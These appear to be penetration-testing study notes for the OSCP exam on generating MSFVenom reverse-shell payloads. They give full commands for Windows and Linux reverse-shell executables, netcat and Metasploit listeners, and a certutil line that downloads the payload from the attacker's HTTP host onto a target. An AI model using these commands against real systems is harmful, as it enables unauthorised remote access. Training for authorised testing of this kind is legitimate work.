# 💣 MSFVenom — Payload Generation 

MSFVenom is used to generate **payloads** also known as an executable that could get us a foothold into machine.

## 🧠 When to Use MSFVenom

Use MSFVenom when:
- You can upload a file
- You can execute a command
- You can trigger execution (service, script, exploit)
- You need a reverse shell or callback

MSFVenom fits here:
> Exploit → Code Execution → Payload → Shell

---

##  Core Concepts 

### Payload
The code that runs on the target after execution.

### Reverse Shell
Target connects **back to you**.
Used most often in OSCP.

### LHOST
Your attacking machine IP (VPN IP).

### LPORT
Port you listen on.

payload strategy 

- Prefer ports like 80, 443, 53
    
- Keep payloads simple
    
- Avoid heavy encoders unless needed
    
- Expect to modify exploits to call payloads

---

## STEP 1 — List Payloads (Optional)

```bash
msfvenom -l payloads
```
## *Common Payloads

### **Windows**
```bash
windows/x64/shell_reverse_tcp
windows/shell_reverse_tcp
```
### **Linux**
```bash
linux/x64/shell_reverse_tcp
linux/x86/shell_reverse_tcp
```
### **Meterpreter**
```bash
windows/x64/meterpreter_reverse_tcp
```

### **Common Delivery Methods**

- Uploaded to SMB share
    
- Downloaded via HTTP
    
- Executed via exploit
    
- Triggered by service/script
- 
## **STEP 2 — Basic Payload Generation**

Windows EXE Reverse Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f exe -o shell.exe

# full example

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o winrev.exe
```

Linux ELF Reverse Shell 
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f elf -o shell.elf
chmod +x shell.elf
```

## **STEP 3 — Set Up Listener**
```bash
nc -lvnp 443
```

## **Alternative with Metasploit**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <YOUR_IP>
set LPORT 443
run
```
**OSCP exam rule:** Metasploit/Meterpreter may only be used on **one machine** during the exam. Use it wisely — save it for a box where you're stuck. All other boxes must use manual techniques.
### **HTTP Download Example (Windows)**

```bash
certutil.exe -urlcache -f http://<YOUR_IP>/winrev.exe C:\Users\Public\winrev.exe
```

This does not run the file, it simply downloads it. In order to execute, add a another string if possibile in your arbitrary command to the program you are exploiting to execute 

```bash
#example for if you were editing exploit
SendString("\\users\\public\\winrev.exe", ip)
```